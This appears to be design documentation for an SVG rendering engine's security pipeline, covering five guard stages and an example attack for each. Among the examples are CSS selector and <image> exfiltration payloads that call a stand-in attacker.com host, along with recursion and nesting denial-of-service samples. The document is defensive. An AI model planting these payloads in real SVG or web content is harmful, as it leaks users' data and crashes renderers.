## SVG rendering pipeline & security layers

```mermaid
flowchart TD
    IN(["SVG document"]) -->|"SVG text (XML)"| SEC1["<b>XML input validation</b>"]
    SEC1 -->|"no"| WARN1["⚠ block & log"]
    SEC1 -->|"yes"| PARSE

    PARSE["<b>1. Parse</b> — script thread<br/>xml5ever — text → DOM tree"]
    PARSE -->|"DOM tree"| SEC2["<b>CSS injection guard</b>"]
    SEC2 -->|"no"| WARN2["⚠ block & log"]
    SEC2 -->|"yes"| STYLE

    STYLE["<b>2. Style</b> — layout thread<br/>Stylo — CSS cascade → computed styles"]
    STYLE -->|"styled elements"| SEC4["<b>Expansion & geometry limits</b>"]
    SEC4 -->|"no"| WARN4["⚠ block & log"]
    SEC4 -->|"yes"| BUILD

    BUILD["<b>4. Build</b> — layout thread<br/>layout::svg — build svgRenderTree"]
    BUILD -->|"SVG render tree"| SEC5["<b>Render safety guard</b>"]
    SEC5 -->|"no"| WARN5["⚠ block & log"]
    SEC5 -->|"yes"| RENDER

    RENDER["<b>5. Render</b> — layout thread<br/>svg_engine"]
    RENDER -->|"display list commands"| BACKEND

    BACKEND["<b>6. Render Service Backend</b>"]

    STYLE -->|"font / CSS request"| SEC3["<b>Fetch allowlist</b>"]
    BUILD -->|"image request"| SEC3
    SEC3 -->|"yes"| FETCH
    SEC3 -->|"no"| WARN3["⚠ block & log"]

    FETCH["<b>3. Fetch</b> — net thread<br/>net — load images, fonts, stylesheets"]
    FETCH -->|"stylesheets, fonts"| STYLE
    FETCH -->|"decoded images"| BUILD

    classDef stage fill:#dbeafe,stroke:#93c5fd,color:#1e3a8a;
    classDef guard fill:#93c5fd,stroke:#2563eb,color:#172554;
    classDef warn fill:#fecaca,stroke:#ef4444,color:#7f1d1d;

    class PARSE,STYLE,BUILD,RENDER,BACKEND,FETCH stage;
    class SEC1,SEC2,SEC3,SEC4,SEC5 guard;
    class WARN1,WARN2,WARN3,WARN4,WARN5 warn;
```

The five layers defend against two kinds of attack:

1. **Resource exhaustion** — wastes CPU, memory, or stack until the engine
   hangs or crashes (DoS). Elements: nested `<g>`/`<svg>`, `<use>`,
   `<pattern>`, entity expansion.
2. **Data exfiltration** — steals readable data and leaks it to an attacker
   server. Elements: `<style>`, `<image>`, `@import`, `@font-face`.

The same category can appear at more than one stage: layers 1, 4 and 5 all
defend against resource exhaustion, and layers 2 and 3 both defend against
data exfiltration — each guards a different stage of the pipeline.

### XML input validation (Stage 1 — Parse)
**Category:** resource exhaustion — deep nesting
**Example:**
```svg
<svg><g><g><g> <!-- …100,000 nested <g>… --> </g></g></g></svg>
```
**Solution:** blocks XXE and entity-expansion bombs, and limits nesting depth
and element count during tokenization.

### CSS injection guard (Stage 2 — Style)
**Category:** data exfiltration — CSS attribute-selector leak
**Example:**
```svg
<svg><style>
  input[value^="a"] { background: url(https://attacker.com/?v=a); }
</style></svg>
```
**Solution:** blocks injected SVG `<style>` from reading host-document data via
attribute selectors + `url()`.

### Fetch allowlist (Stage 3 — Fetch)
**Category:** data exfiltration — remote fetch
**Example:**
```svg
<svg>
  <!-- blocked by: Content-Security-Policy: img-src 'self' -->
  <image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/>
</svg>
```
**Solution:** the engine checks every fetch against the document's Content
Security Policy (CSP) before sending it. A URL not allowed by the policy, like
`attacker.com`, is dropped before the request leaves the process, so no
`<image>`, `@import`, or `@font-face` fetch can leak data to it.

### Expansion & geometry limits (Stage 4 — Build)
**Category:** resource exhaustion — `<use>` mutual recursion
**Example:**
```svg
<svg><g id="l1"><use href="#l2"/></g><g id="l2"><use href="#l1"/></g></svg>
```
**Solution:** limits `<use>` fan-out and extreme `viewBox`, blur, path, and
stroke values before the render tree is built.

### Render safety guard (Stage 5 — Render)
**Category:** resource exhaustion — self-referencing pattern
**Example:**
```svg
<svg><pattern id="p" width="10" height="10"><rect width="10" height="10" fill="url(#p)"/></pattern>
<rect width="100" height="100" fill="url(#p)"/></svg>
```
**Solution:** validates geometry and text and limits self-referencing patterns
before drawing, so crafted input can't crash the renderer or execute code.
